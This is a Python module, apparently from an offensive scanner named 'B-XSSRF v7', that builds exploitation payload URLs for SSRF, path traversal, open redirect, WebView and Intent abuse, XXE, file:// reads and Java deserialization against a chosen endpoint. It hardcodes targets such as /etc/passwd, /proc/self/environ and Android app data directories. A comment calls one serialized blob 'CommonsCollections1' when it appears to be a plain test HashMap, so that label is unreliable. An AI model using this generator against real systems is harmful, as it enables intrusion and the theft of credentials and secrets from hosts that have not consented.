"""
Payload Factory for B-XSSRF v7.
Generates exploitation payloads based on configuration and endpoint context.
"""

from __future__ import annotations

from typing import Any

from config_loader import get_payloads_config
from logging_setup import get_logger, log_operation

logger = get_logger(__name__)


def generate_payloads(base_url: str, categories: list[str] | None = None) -> list[str]:
    """
    Generate exploitation payloads for a given endpoint.

    Args:
        base_url: Base URL/endpoint to generate payloads for
        categories: Optional list of payload categories to generate.
                    If None, uses all enabled categories from config.

    Returns:
        List of unique payload strings
    """
    config = get_payloads_config()

    with log_operation("payload_generation", base_url=base_url, categories=categories):
        base = base_url.rstrip("/")
        all_payloads: list[str] = []

        # Determine which categories to generate
        if categories is None:
            categories = [
                "ssrf", "path_traversal", "open_redirect",
                "webview_abuse", "intent_abuse", "xxe", "file_access"
            ]

        # Generate payloads for each category
        for category in categories:
            payloads = _generate_category_payloads(base, category, config)
            all_payloads.extend(payloads)

        # Deduplicate
        unique_payloads = list(dict.fromkeys(all_payloads))

        logger.info("payloads_generated",
                    base_url=base_url,
                    total=len(unique_payloads),
                    categories=categories)

        return unique_payloads


def _generate_category_payloads(
    base: str,
    category: str,
    config: Any,
) -> list[str]:
    """Generate payloads for a specific category."""
    payloads: list[str] = []

    if category == "ssrf":
        payloads.extend(_ssrf_payloads(base, config))
    elif category == "path_traversal":
        payloads.extend(_path_traversal_payloads(base, config))
    elif category == "open_redirect":
        payloads.extend(_open_redirect_payloads(base, config))
    elif category == "webview_abuse":
        payloads.extend(_webview_abuse_payloads(base, config))
    elif category == "intent_abuse":
        payloads.extend(_intent_abuse_payloads(base, config))
    elif category == "xxe":
        payloads.extend(_xxe_payloads(base, config))
    elif category == "file_access":
        payloads.extend(_file_access_payloads(base, config))
    elif category == "deserialization":
        payloads.extend(_deserialization_payloads(base, config))

    return payloads


def _ssrf_payloads(base: str, config: Any) -> list[str]:
    """Generate SSRF payloads."""
    payloads = []
    params = ["url", "uri", "link", "target", "redirect", "next", "callback", "webhook"]

    for param in params:
        for target in config.ssrf:
            payloads.append(f"{base}?{param}={target}")

    return payloads


def _path_traversal_payloads(base: str, config: Any) -> list[str]:
    """Generate path traversal payloads."""
    payloads = []
    params = ["path", "file", "filename", "document", "template", "include", "page"]

    for param in params:
        for traversal in config.path_traversal:
            payloads.append(f"{base}?{param}={traversal}")

    return payloads


def _open_redirect_payloads(base: str, config: Any) -> list[str]:
    """Generate open redirect payloads."""
    payloads = []
    params = ["redirect", "next", "url", "return", "returnTo", "goto", "target", "continue"]

    for param in params:
        for redirect in config.open_redirect:
            payloads.append(f"{base}?{param}={redirect}")

    return payloads


def _webview_abuse_payloads(base: str, config: Any) -> list[str]:
    """Generate WebView abuse payloads."""
    payloads = []
    params = ["url", "link", "uri", "data"]

    for param in params:
        for abuse in config.webview_abuse:
            payloads.append(f"{base}?{param}={abuse}")

    return payloads


def _intent_abuse_payloads(base: str, config: Any) -> list[str]:
    """Generate Intent abuse payloads."""
    payloads = []

    for abuse in config.intent_abuse:
        # Replace {base} placeholder
        payload = abuse.replace("{base}", base)
        payloads.append(payload)

    return payloads


def _xxe_payloads(base: str, config: Any) -> list[str]:
    """Generate XXE payloads (for XML endpoints)."""
    payloads = []
    params = ["xml", "data", "payload", "content", "body"]

    for param in params:
        for xxe in config.xxe:
            # URL encode for GET params
            import urllib.parse
            encoded = urllib.parse.quote(xxe)
            payloads.append(f"{base}?{param}={encoded}")

    return payloads


def _file_access_payloads(base: str, config: Any) -> list[str]:
    """Generate file:// access payloads."""
    payloads = []
    params = ["file", "path", "document", "template", "include"]
    targets = [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "file:///data/data/",
        "file:///sdcard/",
        "file:///system/build.prop",
    ]

    for param in params:
        for target in targets:
            payloads.append(f"{base}?{param}={target}")

    return payloads


def _deserialization_payloads(base: str, config: Any) -> list[str]:
    """Generate deserialization payloads (Java/PHP/etc)."""
    payloads = []
    params = ["data", "payload", "object", "serialized", "session"]

    # Basic gadget chains (would need ysoserial/gadgetinspector for real ones)
    gadgets = [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABkxzdHJpbmc7eHB0ABl0ZXN0",
        # CommonsCollections1 (base64 encoded)
        "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000e6a6176612e6c616e672e537472696e67a0f0a4387a3bb342020000787074000474657374",
    ]

    for param in params:
        for gadget in gadgets:
            payloads.append(f"{base}?{param}={gadget}")

    return payloads


# ============================
# Advanced Payload Generation (Future)
# ============================

class PayloadGenerator:
    """Advanced context-aware payload generator (for future ML integration)."""

    def __init__(self) -> None:
        self.config = get_payloads_config()

    def generate_for_endpoint(
        self,
        endpoint: str,
        method: str = "GET",
        params: dict[str, str] | None = None,
        headers: dict[str, str] | None = None,
        tech_stack: list[str] | None = None,
    ) -> list[str]:
        """
        Generate tailored payloads based on endpoint context.

        Args:
            endpoint: Target endpoint URL
            method: HTTP method
            params: Known parameters
            headers: Request headers
            tech_stack: Detected technologies (e.g., ["spring", "java", "jackson"])

        Returns:
            Prioritized list of payloads
        """
        # For now, use basic generation
        base_payloads = generate_payloads(endpoint)

        # TODO: Add context-aware prioritization
        # - If tech_stack contains "spring", prioritize SpEL injection
        # - If tech_stack contains "jackson", prioritize deserialization
        # - If params contains "xml", prioritize XXE
        # - If WAF detected, add bypass variants

        return base_payloads

    def classify_endpoint(self, endpoint: str) -> dict[str, Any]:
        """Classify endpoint type for targeted payload generation."""
        # TODO: Implement endpoint classification
        # - REST API
        # - GraphQL
        # - SOAP
        # - WebSocket
        # - Deep Link
        # - File Upload
        # - Template Engine
        return {"type": "unknown", "confidence": 0.0}
